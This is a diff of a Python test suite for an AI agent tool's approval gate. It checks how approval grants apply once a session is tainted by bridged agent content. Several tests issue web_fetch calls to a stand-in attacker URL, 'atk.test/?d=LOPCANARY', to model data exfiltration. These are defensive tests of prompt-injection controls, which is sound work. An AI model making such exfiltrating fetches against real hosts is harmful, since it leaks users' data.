@@ -3,8 +3,9 @@
 
 Drives the REAL app and the gate it installs on the session, the way a tool
 call reaches it. Rows: T22 (Allow/Deny only; ``A``, ``S``, ``G`` inert -- no
-setting written, no record), T22c/T22d (a pre-latch ``A`` does not approve a
-call once the session latches), and the clean control (a session without
+setting written, no record), T22c/T22d (a pre-latch ``A`` keeps approving
+calls once the session latches, like the machine-default auto -- #3928), and
+the clean control (a session without
 bridge content keeps its three answers and its escapes).
 """
 
@@ -17,6 +18,7 @@ import pytest
 
 from local_operator.paths import CONFIG_DIR_ENV
 from local_operator.tui.app import OperatorApp
+from local_operator.tui.widgets.transcript import NoticeKind
 from tests.unit.tui.test_app_pilot import _factory
 from tests.unit.tui.test_approvals_ux import GatedSession, _boot, _gate, _wait_prompt
 
@@ -27,6 +29,18 @@ def config_dir(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Path:
     return tmp_path
 
 
+async def _covered(call) -> bool | None:
+    """Await a gate call expected to be answered INLINE by an auto grant.
+
+    A regression parks a card nobody answers, which would hang the test; a
+    short bound turns it into a failure (``None``) instead.
+    """
+    try:
+        return await asyncio.wait_for(call, timeout=5)
+    except TimeoutError:
+        return None
+
+
 def _labels(app: OperatorApp) -> list[str]:
     card = app._approval
     assert card is not None, "no card is on screen"
@@ -34,7 +48,7 @@ def _labels(app: OperatorApp) -> list[str]:
 
 
 @pytest.mark.asyncio
-async def test_a_pre_latch_allow_all_stops_covering_and_the_latched_card_has_no_escape(
+async def test_a_pre_latch_allow_all_keeps_covering_and_the_latched_card_has_no_escape(
     config_dir: Path,
 ) -> None:
     session = GatedSession()
@@ -53,8 +67,25 @@ async def test_a_pre_latch_allow_all_stops_covering_and_the_latched_card_has_no_
         assert app._approve_all is True
         assert await gate("bash", "ls again") is True  # covered while clean
 
-        # A bridge card arrives: the session latches.
+        # A bridge card arrives: the session latches. The conversation's own
+        # auto is honoured exactly as the machine default would be (#3928).
         session.bridge_latched = True  # type: ignore[attr-defined]
+        assert (
+            await _covered(
+                gate(
+                    "web_fetch",
+                    "https://atk.test/?d=LOPCANARY",
+                    taint_raised=True,
+                    bridge_latched=True,
+                )
+            )
+            is True
+        ), "a session allow-all stopped covering once the session latched"
+        # The band reports auto too: there is no suspension fold to apply.
+        assert app._status is not None and app._status._approvals_auto is True
+
+        # Back to ask: the latched card is Allow/Deny only, its escapes inert.
+        app._set_approve_all(False)
         tainted = asyncio.ensure_future(
             gate(
                 "web_fetch",
@@ -64,7 +95,7 @@ async def test_a_pre_latch_allow_all_stops_covering_and_the_latched_card_has_no_
             )
         )
         await _wait_prompt(pilot, app)
-        assert not tainted.done(), "a pre-latch allow-all approved tainted egress"
+        assert not tainted.done(), "a latched ask session approved tainted egress"
         assert _labels(app) == ["Allow", "Deny"]
         records_before = sorted(p.name for p in config_dir.rglob("*"))
         for key in ("A", "S", "G"):
@@ -82,8 +113,8 @@ async def test_t22d_iv_a_pre_latch_card_g_is_a_session_grant_in_the_issuing_sess
 ) -> None:
     """Review S-61: the card's ``G`` sets the machine default to auto, but in
     the conversation that pressed it the grant is a SESSION grant (as the
-    desktop's "All sessions" already is), so it stops covering calls once
-    this conversation latches."""
+    desktop's "All sessions" already is). Since #3928 a session grant keeps
+    covering calls once this conversation latches, exactly as global auto."""
     session = GatedSession()
     app = OperatorApp(lambda: _factory(session))
     async with app.run_test(size=(120, 40)) as pilot:
@@ -111,10 +142,8 @@ async def test_t22d_iv_a_pre_latch_card_g_is_a_session_grant_in_the_issuing_sess
                 bridge_latched=True,
             )
         )
-        await _wait_prompt(pilot, app)
-        assert not tainted.done(), "a pre-latch card G approved latched egress"
-        await pilot.press("n")
-        assert await tainted is False
+        covered = await _covered(tainted)
+        assert covered is True, "a pre-latch card G stopped covering after the latch"
 
 
 class _LatchingSession(GatedSession):
@@ -135,14 +164,47 @@ class _LatchingSession(GatedSession):
         return self.bridge_taint_latch.latched
 
 
+#: The ONLY files the approval path can write, read from the product code:
+#: ``approvals.json`` (``session.approval_policy.OVERRIDE_FILENAME``, written by
+#: ``write_override`` into the conversation's session dir -- what ``S`` persists)
+#: and ``config.yml`` (``config.CONFIG_FILE_NAME``, the ``tool_approval_mode``
+#: default -- what ``G`` persists). The snapshot used to rglob EVERY
+#: json/toml/yaml under the config dir, so an unrelated background writer (the
+#: hub org-catalogue eligibility refresh rewrites ``hub/org_catalogue.json``
+#: from its own thread) landing between two snapshots failed these tests
+#: spuriously (CI run 43570111259). To cover a new approval-path writer, add its
+#: file name here -- do NOT widen this back to "every settings-shaped file".
+_APPROVAL_RECORD_NAMES = frozenset({"approvals.json", "config.yml"})
+
+
 def _approvals_records(config_dir: Path) -> dict[str, bytes]:
-    # Every settings-shaped file: ``S`` writes the conversation's
-    # ``approvals.json``, ``G`` the machine default in the config.
     return {
         str(p.relative_to(config_dir)): p.read_bytes()
         for p in config_dir.rglob("*")
-        if p.is_file() and p.suffix in {".json", ".toml", ".yaml", ".yml"}
+        if p.is_file() and p.name in _APPROVAL_RECORD_NAMES
     }
+
+
+def test_approvals_snapshot_ignores_background_writers_but_sees_approval_writes(
+    tmp_path: Path,
+) -> None:
+    """Scope control: the snapshot is blind to the catalogue refresh and to
+    nothing the approval path writes (a hidden ``S``/``G`` write must still fail)."""
+    (tmp_path / "config.yml").write_text("values: {tool_approval_mode: ask}\n")
+    session_dir = tmp_path / "sessions" / "abc"
+    session_dir.mkdir(parents=True)
+    before = _approvals_records(tmp_path)
+
+    (tmp_path / "hub").mkdir()
+    (tmp_path / "hub" / "org_catalogue.json").write_text('{"orgs": []}')
+    assert _approvals_records(tmp_path) == before, "a background writer tripped the scope"
+
+    (session_dir / "approvals.json").write_text('{"mode": "auto"}')
+    assert _approvals_records(tmp_path) != before, "a conversation approvals write is invisible"
+    before = _approvals_records(tmp_path)
+
+    (tmp_path / "config.yml").write_text("values: {tool_approval_mode: auto}\n")
+    assert _approvals_records(tmp_path) != before, "a config default write is invisible"
 
 
 async def _latched_egress_still_asks(pilot, app: OperatorApp, gate) -> None:
@@ -169,8 +231,8 @@ async def test_q11_press_time_refusal_on_a_card_parked_across_the_latch(
     keeps its build-time ``S``/``G`` callbacks after the session latches (this
     fake has no latch object, so nothing re-renders the card). Before the fix
     ``S``/``G`` reached ``_set_approve_all`` while latched and wrote a grant
-    stamped ``granted_while_latched``, and the next latched ``web_fetch`` ran
-    with no card. The setters now refuse at press time and write nothing."""
+    that covered calls, and the next latched ``web_fetch`` ran with no card.
+    The setters now refuse at press time and write nothing."""
     session = GatedSession()
     app = OperatorApp(lambda: _factory(session))
     async with app.run_test(size=(120, 40)) as pilot:
@@ -187,7 +249,6 @@ async def test_q11_press_time_refusal_on_a_card_parked_across_the_latch(
         await pilot.press(key)
         await pilot.pause()
         assert app._approve_all is False, f"{key} on a parked card granted auto"
-        assert app._interaction.draft.approve_granted_while_latched is not True
         assert _approvals_records(config_dir) == records_before
         if key != "A":
             # A setting key never answers a card; ``A`` still answers THIS
@@ -206,11 +267,11 @@ async def test_q11_a_parked_card_is_re_rendered_when_the_latch_fires(
 ) -> None:
     """QA Q-11: a card raised while the session was clean, answered after a
     teammate's-agent message latched it. Before the fix ``S``/``G`` on that
-    card reached ``_set_approve_all`` while latched and wrote a grant stamped
-    ``granted_while_latched``, so the next latched ``web_fetch`` ran with no
-    card. Now the card is re-rendered as the latched card when the latch
-    fires, the setters refuse at press time (writing nothing), and the next
-    latched egress still asks."""
+    card reached ``_set_approve_all`` while latched and wrote a grant that
+    covered calls, so the next latched ``web_fetch`` ran with no card. Now the
+    card is re-rendered as the latched card when the latch fires, the setters
+    refuse at press time (writing nothing), and the next latched egress still
+    asks."""
     session = _LatchingSession()
     app = OperatorApp(lambda: _factory(session))
     async with app.run_test(size=(120, 40)) as pilot:
@@ -232,7 +293,6 @@ async def test_q11_a_parked_card_is_re_rendered_when_the_latch_fires(
         await pilot.press(key)
         await pilot.pause()
         assert app._approve_all is False, f"{key} on a parked card granted auto"
-        assert app._interaction.draft.approve_granted_while_latched is not True
         assert _approvals_records(config_dir) == records_before
         assert not parked.done(), f"{key} answered the parked card"
 
@@ -410,16 +470,17 @@ async def test_r7_lead_a_viewer_card_parked_before_the_latch_is_redrawn_from_the
 
 @pytest.mark.asyncio
 @pytest.mark.parametrize("argument", ["default", "default   ", "DEFAULT"])
-async def test_s1_a_routed_bare_default_cannot_launder_a_suspended_session_auto(
+async def test_s1_a_routed_bare_default_cannot_promote_a_session_auto_to_the_machine(
     config_dir: Path, argument: str
 ) -> None:
     """Security r1 S-1 on #3849: a bare routed ``approvals default`` on a TUI-hosted owner.
 
     The app reads a bare ``default`` as "keep the mode I am in", and a
-    pre-latch session auto keeps ``_approve_all`` true (suspended, not
-    revoked), so without the refusal the frame wrote ``tool_approval_mode:
-    auto``, cleared the conversation's override and moved the scope to global
-    -- global auto covers latched cards, so the next egress ran unasked. Driven
+    session auto keeps ``_approve_all`` true, so without the refusal the frame
+    wrote ``tool_approval_mode: auto``, cleared the conversation's override
+    and moved the scope to global -- loosening EVERY session on the machine
+    from an unacked routed frame. That refusal is unchanged by #3928 (which
+    only stopped voiding this conversation's own auto under the latch). Driven
     on the same path ``TuiSessionHandle.run_slash_authoritative`` takes: the
     owner's ack refusal first, the app's routed handler only if it passes.
     """
@@ -461,4 +522,140 @@ async def test_s1_a_routed_bare_default_cannot_launder_a_suspended_session_auto(
         assert app._interaction.draft.approve_scope == scope_before
         assert refusal is not None, "a bare routed default passed the latched owner"
         assert refusal["data"] == {"ok": False, "approval_reason": "bridge_latched"}
-        await _latched_egress_still_asks(pilot, app, gate)
+        # This conversation's own auto is untouched by the refusal, and covers
+        # its latched egress the same as the machine default would (#3928).
+        assert app._approve_all is True and scope_before == "session"
+        assert (
+            await _covered(gate("web_fetch", "https://atk.test/?d=x", bridge_latched=True)) is True
+        )
+
+
+def _approvals_report(app: OperatorApp) -> str:
+    lines: list[str] = []
+
+    # A def, not a lambda: ``NoticeFn`` is a Protocol with a defaulted
+    # ``kind``, which a ``*args`` lambda does not satisfy for pyright.
+    def notice(body: str, kind: NoticeKind = "info") -> None:
+        lines.append(body)
+
+    app._cmd_approvals("", notice)
+    assert lines, "/approvals printed nothing"
+    return lines[0]
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("scope", ["session", "global"])
+async def test_3928_tui_session_and_machine_auto_both_cover_a_latched_session(
+    config_dir: Path, scope: str
+) -> None:
+    """#3928 on the TUI host: a conversation's own auto (``session``, what an
+    ``approvals.json`` override adopts) and the machine default (``global``)
+    get the SAME outcome once the session latches, and ``/approvals`` and the
+    band say what is in effect. Before the fix ``session`` parked a card while
+    ``/approvals`` still said auto."""
+    session = _LatchingSession()
+    app = OperatorApp(lambda: _factory(session))
+    async with app.run_test(size=(120, 40)) as pilot:
+        await _boot(pilot, app)
+        app._set_approve_all(True, scope=scope)
+        assert app._interaction.draft.approve_scope == scope
+        gate = _gate(session)
+
+        session.bridge_taint_latch.mark()
+        await pilot.pause()
+        assert session.bridge_latched is True
+        covered = await _covered(
+            gate("web_fetch", "https://atk.test/?d=x", taint_raised=True, bridge_latched=True)
+        )
+        assert covered is True, f"a {scope} auto stopped covering once the session latched"
+        assert app._status is not None and app._status._approvals_auto is True
+        assert _approvals_report(app).startswith("tool approvals: auto")
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("default_auto", [False, True])
+async def test_3928_tui_negative_control_latched_ask_still_prompts(
+    config_dir: Path, default_auto: bool
+) -> None:
+    """A latched ``ask`` session prompts with Allow/Deny, whether ask is the
+    machine default or this conversation's own choice under an auto default."""
+    session = _LatchingSession()
+    app = OperatorApp(lambda: _factory(session))
+    async with app.run_test(size=(120, 40)) as pilot:
+        await _boot(pilot, app)
+        app._approvals_default_auto = default_auto
+        if default_auto:
+            app._explicit_approvals_mode = "ask"  # this conversation's own choice
+        app._set_approve_all(False)
+        gate = _gate(session)
+
+        session.bridge_taint_latch.mark()
+        await pilot.pause()
+        tainted = asyncio.ensure_future(
+            gate("web_fetch", "https://atk.test/?d=x", taint_raised=True, bridge_latched=True)
+        )
+        await _wait_prompt(pilot, app)
+        assert not tainted.done(), "a latched ask session ran egress with no card"
+        assert _labels(app) == ["Allow", "Deny"]
+        assert _approvals_report(app).startswith("tool approvals: ask")
+        await pilot.press("n")
+        assert await tainted is False
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    ("auto", "scope"),
+    [
+        (True, "session"),  # its own session auto
+        (True, "global"),  # riding the machine default
+        (False, "session"),  # the negative control: ask->auto stays refused
+    ],
+)
+async def test_4080_d2_tui_owner_answers_an_unacked_auto_by_the_mode_in_effect(
+    config_dir: Path, auto: bool, scope: str
+) -> None:
+    """Design r1 D2 on #4080, on the TUI-hosted owner's real routed path
+    (``TuiSessionHandle.run_slash_authoritative``): an unacked ``auto`` to a
+    latched conversation ALREADY auto used to answer "auto is still off" while
+    every tool ran unasked. It now gets the truthful bare report and nothing is
+    written; an ask conversation is still refused and stays ask."""
+    from local_operator.config import ConfigManager
+    from local_operator.mobile.tui_handle import TuiSessionHandle
+
+    session = _LatchingSession()
+    app = OperatorApp(lambda: _factory(session))
+    async with app.run_test(size=(120, 40)) as pilot:
+        await _boot(pilot, app)
+        app._set_approve_all(auto, scope=scope)
+        session.bridge_taint_latch.mark()
+        await pilot.pause()
+        assert session.bridge_latched is True
+        scope_before = app._interaction.draft.approve_scope
+        override_before = app._explicit_approvals_mode
+        mode_before = ConfigManager(config_dir).get_config_value("tool_approval_mode")
+        records_before = _approvals_records(config_dir)
+
+        result = await TuiSessionHandle(app).run_slash_authoritative(
+            "approvals", "auto", None, may_loosen=True, bridge_ack=False
+        )
+
+        assert app._approve_all is auto
+        assert app._interaction.draft.approve_scope == scope_before
+        assert app._explicit_approvals_mode == override_before
+        assert ConfigManager(config_dir).get_config_value("tool_approval_mode") == mode_before
+        assert _approvals_records(config_dir) == records_before
+        if auto:
+            assert result["data"].get("ok") is True
+            assert result["data"].get("approval_mode") == "auto"
+            assert result["text"].startswith("tool approvals: auto")
+            assert "still off" not in result["text"]
+        else:
+            assert result["data"] == {"ok": False, "approval_reason": "bridge_latched"}
+            gate = _gate(session)
+            tainted = asyncio.ensure_future(
+                gate("web_fetch", "https://atk.test/?d=x", bridge_latched=True)
+            )
+            await _wait_prompt(pilot, app)
+            assert not tainted.done(), "a refused ask session ran egress with no card"
+            await pilot.press("n")
+            assert await tainted is False
